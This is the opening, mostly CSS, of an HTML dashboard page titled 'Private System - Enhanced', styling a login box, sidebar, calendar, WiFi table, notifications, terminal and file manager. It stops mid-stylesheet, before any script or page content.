<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System - Enhanced</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Orbitron:wght@400;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
  <style>
    /* Preloader Styles */
    #preloaderOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Orbitron', sans-serif;
      font-size: 2.5em;
      z-index: 9999;
      transition: opacity 1s ease-in-out;
      text-align: center;
    }

    .loader-screen {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      opacity: 1;
      transition: opacity 1s ease-in-out, transform 1s ease-in-out;
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: #000; /* Ensure background is solid for each screen */
    }

    #preloaderOverlay.hidden {
      opacity: 0;
      pointer-events: none;
    }

    .loader-screen.fade-out {
      opacity: 0;
      transform: translateY(-50px);
      pointer-events: none;
    }

    .loader-screen.fade-in {
      opacity: 1;
      transform: translateY(0);
    }

    .loader-title {
        font-size: 1.8em;
        margin-bottom: 20px;
        color: #ff914d;
        text-shadow: 0 0 10px #ff914d, 0 0 20px #ff914d;
    }

    .loading-bar-container {
        width: 80%;
        max-width: 400px;
        height: 20px;
        background-color: #333;
        border-radius: 10px;
        overflow: hidden;
        margin-top: 30px;
        border: 2px solid #ff914d;
    }

    .loading-bar {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, #ff914d, #ffb67a);
        border-radius: 10px;
        transition: width 0.5s ease-out;
    }

    /* Login System Styles */
    * {
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif; /* Default font */
    }
    
    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent scrollbars during login */
    }
    
    .login-box {
      background: rgba(0, 0, 0, 0.85); /* Slightly transparent */
      border-radius: 20px;
      border: 3px solid #ff914d; /* Accent border color */
      box-shadow: 0 0 25px rgba(255, 145, 77, 0.7), 0 0 10px rgba(0,0,0,0.5) inset; /* Dual shadows */
      width: 380px; /* Slightly wider */
      padding: 35px 30px; /* More padding */
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s;
      transform-origin: center;
    }
    
    .login-box:hover {
      transform: translateY(-5px); /* Slight lift on hover */
      box-shadow: 0 0 35px rgba(255, 145, 77, 0.9), 0 0 15px rgba(0,0,0,0.7) inset;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red, 0 0 5px red inset; }
      50% { border-color: #ff914d; box-shadow: 0 0 25px rgba(255, 145, 77, 0.7), 0 0 10px rgba(0,0,0,0.5) inset; }
    }
    
    .login-box h2 {
      font-size: 2em; /* Larger title */
      margin-bottom: 25px;
      font-family: 'Orbitron', sans-serif; /* Sci-fi font */
      color: #ff914d;
      letter-spacing: 1px;
      text-shadow: 0 0 8px #ff914d;
    }
    
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 14px; /* More padding */
      margin-bottom: 18px; /* More margin */
      background: #1c1c1c; /* Darker input background */
      border: none;
      color: #eee; /* Lighter text */
      border-radius: 10px; /* More rounded corners */
      font-size: 1.05em; /* Slightly larger font */
      transition: border-color 0.2s, box-shadow 0.2s;
      border: 1px solid transparent; /* Default transparent border */
    }

    .login-box input[type="text"]:focus,
    .login-box input[type="password"]:focus {
      outline: none;
      border-color: #ff914d; /* Accent border on focus */
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.95em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      color: #ccc; /* Lighter label color */
      justify-content: center; /* Center label content */
    }
    
    #showPassword {
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #ff914d; /* Accent color for checkbox */
    }
    
    #showPassword:checked + span {
      color: #ff914d; /* Change span color when checked */
    }
    
    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #ff4c4c; /* Red for submit */
      color: white;
      font-size: 1.1em; /* Larger button text */
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.2s, box-shadow 0.2s;
      font-weight: bold;
    }

    .login-box button:hover {
      background-color: #ff7373; /* Lighter red on hover */
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 76, 76, 0.5);
    }
    
    .login-box button:active {
      transform: translateY(0); /* Slight press down */
    }

    .attempt-counter, .error-message {
      margin-top: 15px; /* More margin */
      font-size: 0.9em;
      color: #e74c3c; /* Error color */
      min-height: 1.2em; /* Prevent layout shift */
    }
    
    .popup {
      display: none; /* Hidden by default */
      position: absolute;
      top: 50%;
      left: 50%;
      width: 340px; /* Slightly wider */
      padding: 25px;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.9); /* Darker, more opaque popup */
      border: 3px solid #ff914d; /* Accent border */
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(255, 145, 77, 0.8), 0 0 10px rgba(0,0,0,0.6) inset; /* More dramatic shadow */
      z-index: 10;
      backdrop-filter: blur(8px); /* Blur effect */
    }
    
    .popup p {
      font-size: 1.1em;
      margin-bottom: 20px;
      color: #ff914d;
      font-weight: bold;
    }

    .popup input[type="password"] {
      margin-bottom: 20px;
      padding: 12px;
      font-size: 1em;
      border: 1px solid #555; /* Subtle border */
    }

    .popup button {
      width: 100%;
      padding: 12px;
      background-color: #2ecc71; /* Green for reset */
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s;
      font-size: 1em;
    }

    .popup button:hover {
      background-color: #32cd7a; /* Lighter green */
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 0; /* Remove default padding */
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; 
      display: flex; /* Use flexbox for layout */
      flex-direction: column; /* Stack header, sidebar, content */
      height: 100vh;
      overflow: hidden; /* Prevent main body scroll */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }

    /* Header */
    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: linear-gradient(90deg, #ff914d, #ff6b00); /* Gradient header */
      padding: 15px 30px; /* More padding */
      color: #000; /* Black text on header */
      margin-bottom: 20px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      position: sticky; /* Make header sticky */
      top: 0;
      z-index: 100; /* Ensure header is above other content */
    }

    .dashboard-header h1 {
      font-size: 28px; /* Larger title */
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1.5px;
      margin: 0;
      text-shadow: 0 0 8px rgba(0,0,0,0.2);
    }

    .user-info {
      font-weight: bold;
      font-size: 1.1em;
    }
    .user-info span {
        color: #fff; /* White text for user details */
        text-shadow: 0 0 5px rgba(0,0,0,0.3);
    }

    .version-box {
      background: #ffd966;
      padding: 10px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: #000;
      font-weight: bold;
      font-size: 0.95em;
      border: 2px solid #d4af37; /* Gold border */
      box-shadow: 0 0 10px rgba(255, 217, 102, 0.5);
    }

    /* Main Layout: Sidebar + Content Area */
    .main-content-wrapper {
        display: flex;
        flex: 1; /* Takes remaining height */
        overflow: hidden; /* Crucial for scrollable content within fixed layout */
    }

    /* Sidebar Navigation */
    .sidebar {
        width: 250px; /* Fixed sidebar width */
        background-color: #2a2a2a; /* Dark background */
        color: #ccc;
        padding: 20px 0;
        box-shadow: 5px 0 15px rgba(0,0,0,0.4);
        overflow-y: auto; /* Scrollable sidebar */
        flex-shrink: 0; /* Prevent sidebar from shrinking */
        border-right: 1px solid #444;
    }

    body.dashboard-body.light-theme .sidebar {
        background-color: #e0e0e0;
        border-right-color: #bbb;
        box-shadow: 5px 0 15px rgba(0,0,0,0.1);
    }

    .sidebar h3 {
        font-size: 1.3em;
        color: #ff914d;
        margin: 0 20px 25px 20px;
        padding-bottom: 10px;
        border-bottom: 1px solid #444;
        font-family: 'Orbitron', sans-serif;
        letter-spacing: 0.5px;
        text-align: center;
    }

    body.dashboard-body.light-theme .sidebar h3 {
        color: #994d00;
        border-bottom-color: #bbb;
    }

    .sidebar-nav button {
        display: flex;
        align-items: center;
        width: 100%;
        padding: 12px 20px;
        background: none;
        border: none;
        color: #ccc;
        font-size: 1em;
        font-weight: 600;
        text-align: left;
        cursor: pointer;
        transition: background-color 0.2s, color 0.2s, padding-left 0.2s, border-left 0.2s;
        gap: 15px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    body.dashboard-body.light-theme .sidebar-nav button {
        color: #333;
    }

    .sidebar-nav button i { /* For potential icons */
        font-size: 1.2em;
        min-width: 25px; /* Ensure alignment */
        text-align: center;
    }

    .sidebar-nav button:hover {
        background-color: #3a3a3a;
        color: #ff914d; /* Accent color on hover */
        padding-left: 30px; /* Push content right on hover */
        border-left: 3px solid #ff914d;
    }

    body.dashboard-body.light-theme .sidebar-nav button:hover {
        background-color: #d0d0d0;
        color: #994d00;
        border-left-color: #994d00;
    }

    .sidebar-nav button.active {
        background-color: #3a3a3a;
        color: #ff914d;
        border-left: 3px solid #ff914d;
        font-weight: bold;
    }

    body.dashboard-body.light-theme .sidebar-nav button.active {
        background-color: #d0d0d0;
        color: #994d00;
        border-left-color: #994d00;
    }

    /* Content Area */
    .content-area {
      flex-grow: 1; /* Takes remaining width */
      padding: 20px;
      overflow-y: auto; /* Scrollable content */
      position: relative; /* For positioning notifications */
    }

    /* Quick Bar (still exists but perhaps for less critical actions) */
    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px; /* Increased margin */
      flex-wrap: wrap;
      padding: 0 20px; /* Add padding */
    }

    .quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
      min-width: 110px;
      white-space: nowrap;
      font-size: 0.9em;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
      box-shadow: 0 5px 10px rgba(255,145,77,0.4);
    }
    
    .quick-bar button:active {
      transform: translateY(0);
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
      border: 1px solid #cc0000;
    }
    #panicBtn:hover {
      background: #ff7373 !important;
      border-color: #ff4c4c;
    }

    /* Announcement Bar */
    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 40px; /* Taller announcement bar */
      line-height: 20px; /* Center text vertically */
      font-size: 1.1em;
      text-align: center;
      animation: pulse-announcement 1.5s infinite alternate; /* New animation */
    }
    
    @keyframes pulse-announcement {
      from { box-shadow: 0 0 10px rgba(255,145,77,0.5); }
      to { box-shadow: 0 0 20px rgba(255,145,77,0.8); }
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }
    
    /* Main Grid for Dashboard Home */
    .main-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); /* Responsive grid */
      gap: 20px;
      margin-bottom: 20px;
      width: 100%; /* Ensure it takes full width */
    }

    .box {
      background-color: #2a2a2a;
      padding: 25px; /* More padding */
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Inner shadow */
      transition: background-color 0.3s, color 0.3s, transform 0.2s, box-shadow 0.2s;
      display: flex; /* Use flex for content arrangement */
      flex-direction: column;
    }

    body.dashboard-body.light-theme .box {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6), 0 0 5px rgba(255,255,255,0.3) inset; /* Lighter inner shadow */
    }

    .box:hover {
        transform: translateY(-5px);
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .box:hover {
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }

    .box h2 {
      font-size: 20px; /* Larger heading */
      margin-bottom: 15px; /* More margin */
      color: #ff914d;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 0.5px;
      padding-bottom: 5px;
      border-bottom: 1px solid #555; /* Subtle divider */
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00;
      border-bottom-color: #cc9900;
    }

    .box p, .box ul {
      font-size: 14px;
      line-height: 1.6; /* Better readability */
    }
    
    .box ul {
        padding-left: 20px; /* Indent list items */
    }

    .update-entry {
      background: #40210f;
      padding: 10px 12px; /* More padding */
      margin-top: 8px; /* More spacing */
      border-radius: 6px;
      color: #ffccb3;
      font-size: 0.95em;
      border-left: 3px solid #ff914d; /* Accent */
      transition: transform 0.2s;
    }

    body.dashboard-body.light-theme .update-entry {
      background: #ffd999;
      color: #994d00;
      border-left-color: #994d00;
    }

    .update-entry:hover {
        transform: translateX(5px);
    }
    
    /* Calendar Specific */
    .calendar-container { /* Wrapper for calendar */
        flex-grow: 1; /* Allow calendar box to grow */
        display: flex;
        flex-direction: column;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 15px; /* More margin */
      text-align: center;
      font-size: 13px; /* Slightly larger font */
      flex-grow: 1; /* Allow calendar grid to fill space */
    }

    .calendar div {
      padding: 8px; /* More padding */
      background: #333;
      border-radius: 4px;
      transition: background 0.2s, transform 0.1s;
    }

    .calendar div:not(.empty):not(.today):hover {
        background: #444;
        transform: scale(1.05);
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.7);
    }
    .today:hover {
        transform: scale(1.1) !important;
        background: #e6823e !important; /* Darker orange when today */
    }

    body.dashboard-body.light-theme .calendar div {
      background: #ffd966;
      color: #000;
    }
    body.dashboard-body.light-theme .calendar div:not(.empty):not(.today):hover {
        background: #ffefb3;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important;
      color: #ffd966;
    }
    body.dashboard-body.light-theme .today:hover {
        background: #803d00 !important;
    }

    /* Motivation Box */
    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      font-family: 'Source Serif Pro', serif; /* Nicer font for quotes */
      border: 1px dashed #ff914d; /* Dashed border */
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
      border-color: #994d00;
    }

    /* Updates & Notifications Box */
    #updatesNotifications {
      display: flex;
      gap: 20px;
      justify-content: center;
      flex-wrap: wrap; /* Allow wrapping */
      margin-top: 20px;
      width: 100%; /* Ensure it takes full width */
    }

    #updatesNotifications .box {
        flex: 1 1 300px; /* Responsive flex for inner boxes */
        min-width: 280px; /* Minimum width */
    }

    #updatesNotifications h2 {
        color: #ff914d; /* Heading color */
    }

    body.dashboard-body.light-theme #updatesNotifications h2 {
        color: #994d00;
    }

    /* Panel Common Styles */
    .info-panel {
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3), 0 0 5px rgba(0,0,0,0.3) inset;
      transition: background-color 0.3s, color 0.3s, transform 0.2s, box-shadow 0.2s;
      display: none; /* Hidden by default */
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
    }

    .info-panel:hover {
        transform: translateY(-5px);
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .info-panel:hover {
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 20px; /* More margin */
      font-size: 22px;
      font-family: 'Orbitron', sans-serif;
      border-bottom: 1px solid #555;
      padding-bottom: 8px;
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
      border-bottom-color: #cc9900;
    }

    /* WiFi Styles */
    .wifi-grid, .wifi-entry { /* Shared grid styles */
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
      text-align: center;
      font-size: 13px;
    }

    .wifi-grid div, .wifi-entry div {
      padding: 10px; /* More padding */
      background: #333;
      border-radius: 6px;
      font-weight: bold;
      transition: background 0.2s;
    }
    
    .wifi-entry div:not(:first-child):hover { /* Hover for data cells */
        background: #444;
    }

    body.dashboard-body.light-theme .wifi-grid div,
    body.dashboard-body.light-theme .wifi-entry div {
      background: #ffd999;
    }
    body.dashboard-body.light-theme .wifi-entry div:not(:first-child):hover {
        background: #ffebcc;
    }

    /* Handbook, Links, Exploit, Bypass Buttons */
    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons { grid-template-columns: repeat(2, 1fr); }
    .links-list { grid-template-columns: repeat(2, 1fr); }
    .exploit-buttons { grid-template-columns: repeat(4, 1fr); }
    .bypass-buttons { grid-template-columns: repeat(3, 1fr); }

    .handbook-buttons button,
    .links-list a,
    .exploit-buttons a,
    .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
      text-decoration: none; /* For links */
      text-align: center;
      display: flex; /* Use flex for centering text */
      align-items: center;
      justify-content: center;
      height: 50px; /* Fixed height */
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    
    .handbook-buttons button:hover,
    .links-list a:hover,
    .exploit-buttons a:hover,
    .bypass-buttons button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
      box-shadow: 0 5px 10px rgba(255,145,77,0.4);
    }
    
    .handbook-buttons button:active,
    .links-list a:active,
    .exploit-buttons a:active,
    .bypass-buttons button:active {
      transform: translateY(0);
    }

    body.dashboard-body.light-theme .handbook-buttons button,
    body.dashboard-body.light-theme .links-list a,
    body.dashboard-body.light-theme .exploit-buttons a,
    body.dashboard-body.light-theme .bypass-buttons button {
      background-color: #ffd999; /* Lighter theme background */
      color: #994d00; /* Darker text */
    }
    body.dashboard-body.light-theme .handbook-buttons button:hover,
    body.dashboard-body.light-theme .links-list a:hover,
    body.dashboard-body.light-theme .exploit-buttons a:hover,
    body.dashboard-body.light-theme .bypass-buttons button:hover {
        background-color: #ffebcc;
        color: #803d00; /* Even darker text */
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      color: #ffccb3;
      font-size: 1.1em;
      border-left: 3px solid #ff914d;
    }

    body.dashboard-body.light-theme .coming-soon {
      background: #ffd999;
      color: #994d00;
      border-left-color: #994d00;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      color: #ffccb3;
      line-height: 1.6;
      border-left: 3px solid #ff914d;
    }

    body.dashboard-body.light-theme .info-text {
      background: #ffd999;
      color: #994d00;
      border-left-color: #994d00;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
      border-left: 3px solid #ff914d;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #ffd999;
      border-left-color: #994d00;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
      font-size: 0.95em;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content, .bypass-content {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      color: #ffccb3;
      border-left: 3px solid #ff914d;
    }

    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
      color: #994d00;
      border-left-color: #994d00;
    }
    
    /* Canvas Styles */
    #canvasContainer {
      display: none; /* Hidden by default */
      margin-top: 20px;
      text-align: center;
      width: 100%; /* Full width */
      max-width: 600px; /* Max width for canvas area */
      margin-left: auto; margin-right: auto; /* Center */
    }

    #notesCanvas {
      border: 3px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none; /* Prevent default touch actions */
      display: block; /* Remove extra space below canvas */
      margin-bottom: 15px;
      box-shadow: 0 0 20px rgba(255,145,77,0.5);
    }
    
    body.dashboard-body.light-theme #notesCanvas {
        background: #eee;
        box-shadow: 0 0 20px rgba(255,145,77,0.8);
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    /* Notification Area Styles */
    #notificationArea {
      position: fixed;
      top: 70px; /* Below header */
      right: 20px;
      width: 350px;
      max-height: calc(100vh - 100px); /* Account for header & bottom margin */
      overflow-y: auto;
      z-index: 1000;
      display: flex;
      flex-direction: column-reverse; /* Newest at top */
      gap: 10px;
      background-color: rgba(42, 42, 42, 0.8); /* Semi-transparent background */
      padding: 10px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px); /* Blur effect */
    }

    body.dashboard-body.light-theme #notificationArea {
        background-color: rgba(249, 242, 220, 0.8); /* Lighter background */
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }

    .notification-item {
      display: flex;
      align-items: center;
      background-color: #2a2a2a;
      color: #f9f2dc;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
      transition: all 0.3s ease-in-out;
      border-left: 5px solid #ff914d; /* Default accent */
      min-height: 70px; /* Ensure minimum height */
    }

    body.dashboard-body.light-theme .notification-item {
        background-color: #fff3cc;
        color: #994d00;
        border-left-color: #994d00;
    }

    .notification-item.notification-info { border-left-color: #3498db; }
    .notification-item.notification-success { border-left-color: #2ecc71; }
    .notification-item.notification-warning { border-left-color: #f39c12; }
    .notification-item.notification-error { border-left-color: #e74c3c; }

    body.dashboard-body.light-theme .notification-item.notification-info { border-left-color: #3498db; }
    body.dashboard-body.light-theme .notification-item.notification-success { border-left-color: #2ecc71; }
    body.dashboard-body.light-theme .notification-item.notification-warning { border-left-color: #f39c12; }
    body.dashboard-body.light-theme .notification-item.notification-error { border-left-color: #e74c3c; }

    .notification-icon {
      font-size: 24px; /* Larger icon */
      margin-right: 15px;
      font-weight: bold;
      flex-shrink: 0; /* Prevent icon from shrinking */
    }
    .notification-item.notification-info .notification-icon { color: #3498db; }
    .notification-item.notification-success .notification-icon { color: #2ecc71; }
    .notification-item.notification-warning .notification-icon { color: #f39c12; }
    .notification-item.notification-error .notification-icon { color: #e74c3c; }

    .notification-content {
      flex-grow: 1; /* Take available space */
    }

    .notification-message {
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 8px;
    }

    .notification-time {
      font-size: 11px;
      color: rgba(249, 242, 220, 0.7);
    }
    body.dashboard-body.light-theme .notification-time {
        color: rgba(153, 77, 0, 0.7);
    }

    .notification-close {
      background: none;
      border: none;
      color: #f9f2dc;
      font-size: 28px; /* Larger close button */
      margin-left: 15px;
      cursor: pointer;
      opacity: 0.7;
      transition: opacity 0.2s, transform 0.1s;
      padding: 0 5px; /* Easier to click */
    }
    .notification-close:hover {
      opacity: 1;
      transform: scale(1.1);
      color: #fff;
    }
    body.dashboard-body.light-theme .notification-close {
        color: #994d00;
    }
    body.dashboard-body.light-theme .notification-close:hover {
        color: #000;
    }

    .notification-item:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
    }
    body.dashboard-body.light-theme .notification-item:hover {
        box-shadow: 0 6px 25px rgba(0, 0, 0, 0.2);
    }

    /* --- NEW SECTIONS --- */

    /* System Monitor Section */
    .system-monitor-container {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }
    .monitor-box {
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.3), 0 0 5px rgba(0,0,0,0.3) inset;
      flex: 1 1 250px; /* Responsive */
      display: flex;
      flex-direction: column;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    body.dashboard-body.light-theme .monitor-box {
      background-color: #e0ffff; /* Light cyan theme */
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
    }
    .monitor-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .monitor-box:hover {
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .monitor-box h3 {
      font-size: 18px;
      margin-bottom: 15px;
      color: #00ffff; /* Cyan heading */
      font-family: 'Orbitron', sans-serif;
      border-bottom: 1px solid #00cccc;
      padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .monitor-box h3 {
      color: #009999;
      border-bottom-color: #00cccc;
    }
    .progress-bar-label {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 0.9em;
        font-weight: bold;
    }
    .progress-bar-container {
        width: 100%;
        height: 20px;
        background-color: #333;
        border-radius: 10px;
        overflow: hidden;
        border: 1px solid #555;
    }
    body.dashboard-body.light-theme .progress-bar-container {
        background-color: #ccc;
        border-color: #bbb;
    }
    .progress-bar {
        height: 100%;
        background: linear-gradient(90deg, #00c6ff, #0072ff); /* Blue gradient */
        transition: width 0.5s ease-out;
    }
    body.dashboard-body.light-theme .progress-bar {
        background: linear-gradient(90deg, #00aaff, #0055cc); /* Darker blue gradient */
    }

    /* Terminal Section */
    .terminal-container {
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 128, 0.3), 0 0 5px rgba(0,0,0,0.3) inset;
      min-height: 200px;
      display: flex;
      flex-direction: column;
      font-family: 'Source Code Pro', monospace; /* Monospace font */
      border: 1px solid #008000; /* Green border */
    }
    body.dashboard-body.light-theme .terminal-container {
      background-color: #f0fff0; /* Light green theme */
      box-shadow: 0 0 15px rgba(0, 255, 128, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
      border-color: #006400; /* Darker green border */
    }
    .terminal-container:hover {
      box-shadow: 0 0 25px rgba(0, 255, 128, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .terminal-container:hover {
      box-shadow: 0 0 25px rgba(0, 255, 128, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }

    .terminal-output {
      flex-grow: 1;
      overflow-y: auto;
      margin-bottom: 15px;
      color: #00ff00; /* Bright green text */
      white-space: pre-wrap; /* Preserve formatting */
      line-height: 1.5;
    }
    body.dashboard-body.light-theme .terminal-output {
        color: #004d00; /* Darker green for text */
    }

    .terminal-input-line {
      display: flex;
      align-items: center;
      color: #00ff00; /* Green prompt */
    }
    body.dashboard-body.light-theme .terminal-input-line {
        color: #006400;
    }
    .terminal-prompt {
      margin-right: 10px;
      font-weight: bold;
    }
    .terminal-input {
      flex-grow: 1;
      background: none;
      border: none;
      color: inherit; /* Inherit color from parent */
      outline: none;
      font-family: inherit;
      font-size: 1em;
      caret-color: #00ff00; /* Green cursor */
    }
    body.dashboard-body.light-theme .terminal-input {
        caret-color: #006400;
    }

    /* File Manager Section */
    .file-manager-container {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }
    .file-browser {
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 182, 193, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Pinkish theme */
      flex: 1 1 300px;
